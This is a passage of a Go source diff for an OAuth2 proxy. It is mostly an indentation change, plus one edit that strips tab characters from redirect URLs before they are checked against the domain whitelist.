p.provider.GetEmailAddress(s)\n+        }\n+\n+        if s.PreferredUsername == \"\" {\n+                s.PreferredUsername, err = p.provider.GetPreferredUsername(s)\n+                if err != nil && err.Error() == \"not implemented\" {\n+                        err = nil\n+                }\n+        }\n+\n+        if s.User == \"\" {\n+                s.User, err = p.provider.GetUserName(s)\n+                if err != nil && err.Error() == \"not implemented\" {\n+                        err = nil\n+                }\n+        }\n+        return\n }\n \n // MakeCSRFCookie creates a cookie for CSRF\n func (p *OAuthProxy) MakeCSRFCookie(req *http.Request, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\treturn p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n+        return p.makeCookie(req, p.CSRFCookieName, value, expiration, now)\n }\n \n func (p *OAuthProxy) makeCookie(req *http.Request, name string, value string, expiration time.Duration, now time.Time) *http.Cookie {\n-\tcookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n-\n-\tif cookieDomain != \"\" {\n-\t\tdomain := cookies.GetRequestHost(req)\n-\t\tif h, _, err := net.SplitHostPort(domain); err == nil {\n-\t\t\tdomain = h\n-\t\t}\n-\t\tif !strings.HasSuffix(domain, cookieDomain) {\n-\t\t\tlogger.Printf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n-\t\t}\n-\t}\n-\n-\treturn &http.Cookie{\n-\t\tName:     name,\n-\t\tValue:    value,\n-\t\tPath:     p.CookiePath,\n-\t\tDomain:   cookieDomain,\n-\t\tHttpOnly: p.CookieHTTPOnly,\n-\t\tSecure:   p.CookieSecure,\n-\t\tExpires:  now.Add(expiration),\n-\t\tSameSite: cookies.ParseSameSite(p.CookieSameSite),\n-\t}\n+        cookieDomain := cookies.GetCookieDomain(req, p.CookieDomains)\n+\n+        if cookieDomain != \"\" {\n+                domain := cookies.GetRequestHost(req)\n+                if h, _, err := net.SplitHostPort(domain); err == nil {\n+                        domain = h\n+                }\n+                if !strings.HasSuffix(domain, cookieDomain) {\n+                        logger.Printf(\"Warning: request host is %q but using configured cookie domain of %q\", domain, cookieDomain)\n+                }\n+        }\n+\n+        return &http.Cookie{\n+                Name:     name,\n+                Value:    value,\n+                Path:     p.CookiePath,\n+                Domain:   cookieDomain,\n+                HttpOnly: p.CookieHTTPOnly,\n+                Secure:   p.CookieSecure,\n+                Expires:  now.Add(expiration),\n+                SameSite: cookies.ParseSameSite(p.CookieSameSite),\n+        }\n }\n \n // ClearCSRFCookie creates a cookie to unset the CSRF cookie stored in the user's\n // session\n func (p *OAuthProxy) ClearCSRFCookie(rw http.ResponseWriter, req *http.Request) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, \"\", time.Hour*-1, time.Now()))\n }\n \n // SetCSRFCookie adds a CSRF cookie to the response\n func (p *OAuthProxy) SetCSRFCookie(rw http.ResponseWriter, req *http.Request, val string) {\n-\thttp.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n+        http.SetCookie(rw, p.MakeCSRFCookie(req, val, p.CookieExpire, time.Now()))\n }\n \n // ClearSessionCookie creates a cookie to unset the user's authentication cookie\n // stored in the user's session\n func (p *OAuthProxy) ClearSessionCookie(rw http.ResponseWriter, req *http.Request) error {\n-\treturn p.sessionStore.Clear(rw, req)\n+        return p.sessionStore.Clear(rw, req)\n }\n \n // LoadCookiedSession reads the user's authentication details from the request\n func (p *OAuthProxy) LoadCookiedSession(req *http.Request) (*sessionsapi.SessionState, error) {\n-\treturn p.sessionStore.Load(req)\n+        return p.sessionStore.Load(req)\n }\n \n // SaveSession creates a new session cookie value and sets this on the response\n func (p *OAuthProxy) SaveSession(rw http.ResponseWriter, req *http.Request, s *sessionsapi.SessionState) error {\n-\treturn p.sessionStore.Save(rw, req, s)\n+        return p.sessionStore.Save(rw, req, s)\n }\n \n // RobotsTxt disallows scraping pages from the OAuthProxy\n func (p *OAuthProxy) RobotsTxt(rw http.ResponseWriter) {\n-\trw.WriteHeader(http.StatusOK)\n-\tfmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n+        rw.WriteHeader(http.StatusOK)\n+        fmt.Fprintf(rw, \"User-agent: *\\nDisallow: /\")\n }\n \n // PingPage responds 200 OK to requests\n func (p *OAuthProxy) PingPage(rw http.ResponseWriter) {\n-\trw.WriteHeader(http.StatusOK)\n-\tfmt.Fprintf(rw, \"OK\")\n+        rw.WriteHeader(http.StatusOK)\n+        fmt.Fprintf(rw, \"OK\")\n }\n \n // ErrorPage writes an error response\n func (p *OAuthProxy) ErrorPage(rw http.ResponseWriter, code int, title string, message string) {\n-\trw.WriteHeader(code)\n-\tt := struct {\n-\t\tTitle       string\n-\t\tMessage     string\n-\t\tProxyPrefix string\n-\t}{\n-\t\tTitle:       fmt.Sprintf(\"%d %s\", code, title),\n-\t\tMessage:     message,\n-\t\tProxyPrefix: p.ProxyPrefix,\n-\t}\n-\tp.templates.ExecuteTemplate(rw, \"error.html\", t)\n+        rw.WriteHeader(code)\n+        t := struct {\n+                Title       string\n+                Message     string\n+                ProxyPrefix string\n+        }{\n+                Title:       fmt.Sprintf(\"%d %s\", code, title),\n+                Message:     message,\n+                ProxyPrefix: p.ProxyPrefix,\n+        }\n+        p.templates.ExecuteTemplate(rw, \"error.html\", t)\n }\n \n // SignInPage writes the sing in template to the response\n func (p *OAuthProxy) SignInPage(rw http.ResponseWriter, req *http.Request, code int) {\n-\tprepareNoCache(rw)\n-\tp.ClearSessionCookie(rw, req)\n-\trw.WriteHeader(code)\n-\n-\tredirectURL, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tif redirectURL == p.SignInPath {\n-\t\tredirectURL = \"/\"\n-\t}\n-\n-\tt := struct {\n-\t\tProviderName  string\n-\t\tSignInMessage template.HTML\n-\t\tCustomLogin   bool\n-\t\tRedirect      string\n-\t\tVersion       string\n-\t\tProxyPrefix   string\n-\t\tFooter        template.HTML\n-\t}{\n-\t\tProviderName:  p.provider.Data().ProviderName,\n-\t\tSignInMessage: template.HTML(p.SignInMessage),\n-\t\tCustomLogin:   p.displayCustomLoginForm(),\n-\t\tRedirect:      redirectURL,\n-\t\tVersion:       VERSION,\n-\t\tProxyPrefix:   p.ProxyPrefix,\n-\t\tFooter:        template.HTML(p.Footer),\n-\t}\n-\tif p.providerNameOverride != \"\" {\n-\t\tt.ProviderName = p.providerNameOverride\n-\t}\n-\tp.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n+        prepareNoCache(rw)\n+        p.ClearSessionCookie(rw, req)\n+        rw.WriteHeader(code)\n+\n+        redirectURL, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+\n+        if redirectURL == p.SignInPath {\n+                redirectURL = \"/\"\n+        }\n+\n+        t := struct {\n+                ProviderName  string\n+                SignInMessage template.HTML\n+                CustomLogin   bool\n+                Redirect      string\n+                Version       string\n+                ProxyPrefix   string\n+                Footer        template.HTML\n+        }{\n+                ProviderName:  p.provider.Data().ProviderName,\n+                SignInMessage: template.HTML(p.SignInMessage),\n+                CustomLogin:   p.displayCustomLoginForm(),\n+                Redirect:      redirectURL,\n+                Version:       VERSION,\n+                ProxyPrefix:   p.ProxyPrefix,\n+                Footer:        template.HTML(p.Footer),\n+        }\n+        if p.providerNameOverride != \"\" {\n+                t.ProviderName = p.providerNameOverride\n+        }\n+        p.templates.ExecuteTemplate(rw, \"sign_in.html\", t)\n }\n \n // ManualSignIn handles basic auth logins to the proxy\n func (p *OAuthProxy) ManualSignIn(rw http.ResponseWriter, req *http.Request) (string, bool) {\n-\tif req.Method != \"POST\" || p.HtpasswdFile == nil {\n-\t\treturn \"\", false\n-\t}\n-\tuser := req.FormValue(\"username\")\n-\tpasswd := req.FormValue(\"password\")\n-\tif user == \"\" {\n-\t\treturn \"\", false\n-\t}\n-\t// check auth\n-\tif p.HtpasswdFile.Validate(user, passwd) {\n-\t\tlogger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n-\t\treturn user, true\n-\t}\n-\tlogger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n-\treturn \"\", false\n+        if req.Method != \"POST\" || p.HtpasswdFile == nil {\n+                return \"\", false\n+        }\n+        user := req.FormValue(\"username\")\n+        passwd := req.FormValue(\"password\")\n+        if user == \"\" {\n+                return \"\", false\n+        }\n+        // check auth\n+        if p.HtpasswdFile.Validate(user, passwd) {\n+                logger.PrintAuthf(user, req, logger.AuthSuccess, \"Authenticated via HtpasswdFile\")\n+                return user, true\n+        }\n+        logger.PrintAuthf(user, req, logger.AuthFailure, \"Invalid authentication via HtpasswdFile\")\n+        return \"\", false\n }\n \n // GetRedirect reads the query parameter to get the URL to redirect clients to\n // once authenticated with the OAuthProxy\n func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error) {\n-\terr = req.ParseForm()\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\n-\tredirect = req.Header.Get(\"X-Auth-Request-Redirect\")\n-\tif req.Form.Get(\"rd\") != \"\" {\n-\t\tredirect = req.Form.Get(\"rd\")\n-\t}\n-\tif !p.IsValidRedirect(redirect) {\n-\t\tredirect = req.URL.Path\n-\t\tif strings.HasPrefix(redirect, p.ProxyPrefix) {\n-\t\t\tredirect = \"/\"\n-\t\t}\n-\t}\n-\n-\treturn\n+        err = req.ParseForm()\n+        if err != nil {\n+                return\n+        }\n+\n+        redirect = req.Header.Get(\"X-Auth-Request-Redirect\")\n+        if req.Form.Get(\"rd\") != \"\" {\n+                redirect = req.Form.Get(\"rd\")\n+        }\n+        if !p.IsValidRedirect(redirect) {\n+                redirect = req.URL.Path\n+                if strings.HasPrefix(redirect, p.ProxyPrefix) {\n+                        redirect = \"/\"\n+                }\n+        }\n+\n+        return\n }\n \n // splitHostPort separates host and port. If the port is not valid, it returns\n@@ -543,332 +543,332 @@ func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error)\n // Unlike net.SplitHostPort, but per RFC 3986, it requires ports to be numeric.\n // *** taken from net/url, modified validOptionalPort() to accept \":*\"\n func splitHostPort(hostport string) (host, port string) {\n-\thost = hostport\n+        host = hostport\n \n-\tcolon := strings.LastIndexByte(host, ':')\n-\tif colon != -1 && validOptionalPort(host[colon:]) {\n-\t\thost, port = host[:colon], host[colon+1:]\n-\t}\n+        colon := strings.LastIndexByte(host, ':')\n+        if colon != -1 && validOptionalPort(host[colon:]) {\n+                host, port = host[:colon], host[colon+1:]\n+        }\n \n-\tif strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n-\t\thost = host[1 : len(host)-1]\n-\t}\n+        if strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n+                host = host[1 : len(host)-1]\n+        }\n \n-\treturn\n+        return\n }\n \n // validOptionalPort reports whether port is either an empty string\n // or matches /^:\\d*$/\n // *** taken from net/url, modified to accept \":*\"\n func validOptionalPort(port string) bool {\n-\tif port == \"\" || port == \":*\" {\n-\t\treturn true\n-\t}\n-\tif port[0] != ':' {\n-\t\treturn false\n-\t}\n-\tfor _, b := range port[1:] {\n-\t\tif b < '0' || b > '9' {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\treturn true\n+        if port == \"\" || port == \":*\" {\n+                return true\n+        }\n+        if port[0] != ':' {\n+                return false\n+        }\n+        for _, b := range port[1:] {\n+                if b < '0' || b > '9' {\n+                        return false\n+                }\n+        }\n+        return true\n }\n \n // IsValidRedirect checks whether the redirect URL is whitelisted\n func (p *OAuthProxy) IsValidRedirect(redirect string) bool {\n-\tswitch {\n-\tcase strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !strings.HasPrefix(redirect, \"/\\\\\"):\n-\t\treturn true\n-\tcase strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n-\t\tredirectURL, err := url.Parse(redirect)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n-\t\t\treturn false\n-\t\t}\n-\t\tredirectHostname := redirectURL.Hostname()\n-\n-\t\tfor _, domain := range p.whitelistDomains {\n-\t\t\tdomainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n-\t\t\tif domainHostname == \"\" {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\n-\t\t\tif (redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) {\n-\t\t\t\t// the domain names match, now validate the ports\n-\t\t\t\t// if the whitelisted domain's port is '*', allow all ports\n-\t\t\t\t// if the whitelisted domain contains a specific port, only allow that port\n-\t\t\t\t// if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n-\t\t\t\tredirectPort := redirectURL.Port()\n-\t\t\t\tif (domainPort == \"*\") ||\n-\t\t\t\t\t(domainPort == redirectPort) ||\n-\t\t\t\t\t(domainPort == \"\" && redirectPort == \"\") {\n-\t\t\t\t\treturn true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n-\t\treturn false\n-\tdefault:\n-\t\tlogger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n-\t\treturn false\n-\t}\n+        switch {\n+        case strings.HasPrefix(redirect, \"/\") && !strings.HasPrefix(redirect, \"//\") && !strings.HasPrefix(redirect, \"/\\\\\"):\n+                return true\n+        case strings.HasPrefix(redirect, \"http://\") || strings.HasPrefix(redirect, \"https://\"):\n+                redirectURL, err := url.Parse(strings.Replace(redirect, \"\\t\", \"\", -1))\n+                if err != nil {\n+                        logger.Printf(\"Rejecting invalid redirect %q: scheme unsupported or missing\", redirect)\n+                        return false\n+                }\n+                redirectHostname := redirectURL.Hostname()\n+\n+                for _, domain := range p.whitelistDomains {\n+                        domainHostname, domainPort := splitHostPort(strings.TrimLeft(domain, \".\"))\n+                        if domainHostname == \"\" {\n+                                continue\n+                        }\n+\n+                        if (redirectHostname == domainHostname) || (strings.HasPrefix(domain, \".\") && strings.HasSuffix(redirectHostname, domainHostname)) {\n+                                // the domain names match, now validate the ports\n+                                // if the whitelisted domain's port is '*', allow all ports\n+                                // if the whitelisted domain contains a specific port, only allow that port\n+                                // if the whitelisted domain doesn't contain a port at all, only allow empty redirect ports ie http and https\n+                                redirectPort := redirectURL.Port()\n+                                if (domainPort == \"*\") ||\n+                                        (domainPort == redirectPort) ||\n+                                        (domainPort == \"\" && redirectPort == \"\") {\n+                                        return true\n+                                }\n+                        }\n+                }\n+\n+                logger.Printf(\"Rejecting invalid redirect %q: domain / port not in whitelist\", redirect)\n+                return false\n+        default:\n+                logger.Printf(\"Rejecting invalid redirect %q: not an absolute or relative URL\", redirect)\n+                return false\n+        }\n }\n \n // IsWhitelistedRequest is used to check if auth should be skipped for this request\n func (p *OAuthProxy) IsWhitelistedRequest(req *http.Request) bool {\n-\tisPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n-\treturn isPreflightRequestAllowed || p.IsWhitelistedPath(req.URL.Path)\n+        isPreflightRequestAllowed := p.skipAuthPreflight && req.Method == \"OPTIONS\"\n+        return isPreflightRequestAllowed || p.IsWhitelistedPath(req.URL.Path)\n }\n \n // IsWhitelistedPath is used to check if the request path is allowed without auth\n func (p *OAuthProxy) IsWhitelistedPath(path string) bool {\n-\tfor _, u := range p.compiledRegex {\n-\t\tif u.MatchString(path) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, u := range p.compiledRegex {\n+                if u.MatchString(path) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func getRemoteAddr(req *http.Request) (s string) {\n-\ts = req.RemoteAddr\n-\tif req.Header.Get(\"X-Real-IP\") != \"\" {\n-\t\ts += fmt.Sprintf(\" (%q)\", req.Header.Get(\"X-Real-IP\"))\n-\t}\n-\treturn\n+        s = req.RemoteAddr\n+        if req.Header.Get(\"X-Real-IP\") != \"\" {\n+                s += fmt.Sprintf(\" (%q)\", req.Header.Get(\"X-Real-IP\"))\n+        }\n+        return\n }\n \n // See https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=en\n var noCacheHeaders = map[string]string{\n-\t\"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n-\t\"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n-\t\"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n+        \"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n+        \"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n+        \"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n }\n \n // prepareNoCache prepares headers for preventing browser caching.\n func prepareNoCache(w http.ResponseWriter) {\n-\t// Set NoCache headers\n-\tfor k, v := range noCacheHeaders {\n-\t\tw.Header().Set(k, v)\n-\t}\n+        // Set NoCache headers\n+        for k, v := range noCacheHeaders {\n+                w.Header().Set(k, v)\n+        }\n }\n \n func (p *OAuthProxy) ServeHTTP(rw http.ResponseWriter, req *http.Request) {\n-\tif strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n-\t\tprepareNoCache(rw)\n-\t}\n-\n-\tswitch path := req.URL.Path; {\n-\tcase path == p.RobotsPath:\n-\t\tp.RobotsTxt(rw)\n-\tcase path == p.PingPath:\n-\t\tp.PingPage(rw)\n-\tcase p.IsWhitelistedRequest(req):\n-\t\tp.serveMux.ServeHTTP(rw, req)\n-\tcase path == p.SignInPath:\n-\t\tp.SignIn(rw, req)\n-\tcase path == p.SignOutPath:\n-\t\tp.SignOut(rw, req)\n-\tcase path == p.OAuthStartPath:\n-\t\tp.OAuthStart(rw, req)\n-\tcase path == p.OAuthCallbackPath:\n-\t\tp.OAuthCallback(rw, req)\n-\tcase path == p.AuthOnlyPath:\n-\t\tp.AuthenticateOnly(rw, req)\n-\tcase path == p.UserInfoPath:\n-\t\tp.UserInfo(rw, req)\n-\tdefault:\n-\t\tp.Proxy(rw, req)\n-\t}\n+        if strings.HasPrefix(req.URL.Path, p.ProxyPrefix) {\n+                prepareNoCache(rw)\n+        }\n+\n+        switch path := req.URL.Path; {\n+        case path == p.RobotsPath:\n+                p.RobotsTxt(rw)\n+        case path == p.PingPath:\n+                p.PingPage(rw)\n+        case p.IsWhitelistedRequest(req):\n+                p.serveMux.ServeHTTP(rw, req)\n+        case path == p.SignInPath:\n+                p.SignIn(rw, req)\n+        case path == p.SignOutPath:\n+                p.SignOut(rw, req)\n+        case path == p.OAuthStartPath:\n+                p.OAuthStart(rw, req)\n+        case path == p.OAuthCallbackPath:\n+                p.OAuthCallback(rw, req)\n+        case path == p.AuthOnlyPath:\n+                p.AuthenticateOnly(rw, req)\n+        case path == p.UserInfoPath:\n+                p.UserInfo(rw, req)\n+        default:\n+                p.Proxy(rw, req)\n+        }\n }\n \n // SignIn serves a page prompting users to sign in\n func (p *OAuthProxy) SignIn(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\n-\tuser, ok := p.ManualSignIn(rw, req)\n-\tif ok {\n-\t\tsession := &sessionsapi.SessionState{User: user}\n-\t\tp.SaveSession(rw, req, session)\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusOK)\n-\t\t}\n-\t}\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+\n+        user, ok := p.ManualSignIn(rw, req)\n+        if ok {\n+                session := &sessionsapi.SessionState{User: user}\n+                p.SaveSession(rw, req, session)\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusOK)\n+                }\n+        }\n }\n \n //UserInfo endpoint outputs session email and preferred username in JSON format\n func (p *OAuthProxy) UserInfo(rw http.ResponseWriter, req *http.Request) {\n \n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\tuserInfo := struct {\n-\t\tEmail             string `json:\"email\"`\n-\t\tPreferredUsername string `json:\"preferredUsername,omitempty\"`\n-\t}{\n-\t\tEmail:             session.Email,\n-\t\tPreferredUsername: session.PreferredUsername,\n-\t}\n-\trw.Header().Set(\"Content-Type\", \"application/json\")\n-\trw.WriteHeader(http.StatusOK)\n-\tjson.NewEncoder(rw).Encode(userInfo)\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n+                return\n+        }\n+        userInfo := struct {\n+                Email             string `json:\"email\"`\n+                PreferredUsername string `json:\"preferredUsername,omitempty\"`\n+        }{\n+                Email:             session.Email,\n+                PreferredUsername: session.PreferredUsername,\n+        }\n+        rw.Header().Set(\"Content-Type\", \"application/json\")\n+        rw.WriteHeader(http.StatusOK)\n+        json.NewEncoder(rw).Encode(userInfo)\n }\n \n // SignOut sends a response to clear the authentication cookie\n func (p *OAuthProxy) SignOut(rw http.ResponseWriter, req *http.Request) {\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tp.ClearSessionCookie(rw, req)\n-\thttp.Redirect(rw, req, redirect, http.StatusFound)\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        p.ClearSessionCookie(rw, req)\n+        http.Redirect(rw, req, redirect, http.StatusFound)\n }\n \n // OAuthStart starts the OAuth2 authentication flow\n func (p *OAuthProxy) OAuthStart(rw http.ResponseWriter, req *http.Request) {\n-\tprepareNoCache(rw)\n-\tnonce, err := encryption.Nonce()\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining nonce: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tp.SetCSRFCookie(rw, req, nonce)\n-\tredirect, err := p.GetRedirect(req)\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error obtaining redirect: %s\", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\tredirectURI := p.GetRedirectURI(req.Host)\n-\thttp.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n+        prepareNoCache(rw)\n+        nonce, err := encryption.Nonce()\n+        if err != nil {\n+                logger.Printf(\"Error obtaining nonce: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        p.SetCSRFCookie(rw, req, nonce)\n+        redirect, err := p.GetRedirect(req)\n+        if err != nil {\n+                logger.Printf(\"Error obtaining redirect: %s\", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        redirectURI := p.GetRedirectURI(req.Host)\n+        http.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n }\n \n // OAuthCallback is the OAuth2 authentication flow callback that finishes the\n // OAuth2 authentication flow\n func (p *OAuthProxy) OAuthCallback(rw http.ResponseWriter, req *http.Request) {\n-\tremoteAddr := getRemoteAddr(req)\n-\n-\t// finish the oauth cycle\n-\terr := req.ParseForm()\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 callback: %s\" + err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n-\t\treturn\n-\t}\n-\terrorString := req.Form.Get(\"error\")\n-\tif errorString != \"\" {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 callback: %s \", errorString)\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", errorString)\n-\t\treturn\n-\t}\n-\n-\tsession, err := p.redeemCode(req.Host, req.Form.Get(\"code\"))\n-\tif err != nil {\n-\t\tlogger.Printf(\"Error redeeming code during OAuth2 callback: %s \", err.Error())\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n-\t\treturn\n-\t}\n-\n-\ts := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n-\tif len(s) != 2 {\n-\t\tlogger.Printf(\"Error while parsing OAuth2 state: invalid length\")\n-\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Invalid State\")\n-\t\treturn\n-\t}\n-\tnonce := s[0]\n-\tredirect := s[1]\n-\tc, err := req.Cookie(p.CSRFCookieName)\n-\tif err != nil {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable too obtain CSRF cookie\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", err.Error())\n-\t\treturn\n-\t}\n-\tp.ClearCSRFCookie(rw, req)\n-\tif c.Value != nonce {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: csrf token mismatch, potential attack\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", \"csrf failed\")\n-\t\treturn\n-\t}\n-\n-\tif !p.IsValidRedirect(redirect) {\n-\t\tredirect = \"/\"\n-\t}\n-\n-\t// set cookie, or deny\n-\tif p.Validator(session.Email) && p.provider.ValidateGroup(session.Email) {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n-\t\terr := p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.Printf(\"%s %s\", remoteAddr, err)\n-\t\t\tp.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n-\t\t\treturn\n-\t\t}\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n-\t\tp.ErrorPage(rw, 403, \"Permission Denied\", \"Invalid Account\")\n-\t}\n+        remoteAddr := getRemoteAddr(req)\n+\n+        // finish the oauth cycle\n+        err := req.ParseForm()\n+        if err != nil {\n+                logger.Printf(\"Error while parsing OAuth2 callback: %s\" + err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", err.Error())\n+                return\n+        }\n+        errorString := req.Form.Get(\"error\")\n+        if errorString != \"\" {\n+                logger.Printf(\"Error while parsing OAuth2 callback: %s \", errorString)\n+                p.ErrorPage(rw, 403, \"Permission Denied\", errorString)\n+                return\n+        }\n+\n+        session, err := p.redeemCode(req.Host, req.Form.Get(\"code\"))\n+        if err != nil {\n+                logger.Printf(\"Error redeeming code during OAuth2 callback: %s \", err.Error())\n+                p.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n+                return\n+        }\n+\n+        s := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n+        if len(s) != 2 {\n+                logger.Printf(\"Error while parsing OAuth2 state: invalid length\")\n+                p.ErrorPage(rw, 500, \"Internal Error\", \"Invalid State\")\n+                return\n+        }\n+        nonce := s[0]\n+        redirect := s[1]\n+        c, err := req.Cookie(p.CSRFCookieName)\n+        if err != nil {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable too obtain CSRF cookie\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", err.Error())\n+                return\n+        }\n+        p.ClearCSRFCookie(rw, req)\n+        if c.Value != nonce {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: csrf token mismatch, potential attack\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", \"csrf failed\")\n+                return\n+        }\n+\n+        if !p.IsValidRedirect(redirect) {\n+                redirect = \"/\"\n+        }\n+\n+        // set cookie, or deny\n+        if p.Validator(session.Email) && p.provider.ValidateGroup(session.Email) {\n+                logger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n+                err := p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.Printf(\"%s %s\", remoteAddr, err)\n+                        p.ErrorPage(rw, 500, \"Internal Error\", \"Internal Error\")\n+                        return\n+                }\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n+                p.ErrorPage(rw, 403, \"Permission Denied\", \"Invalid 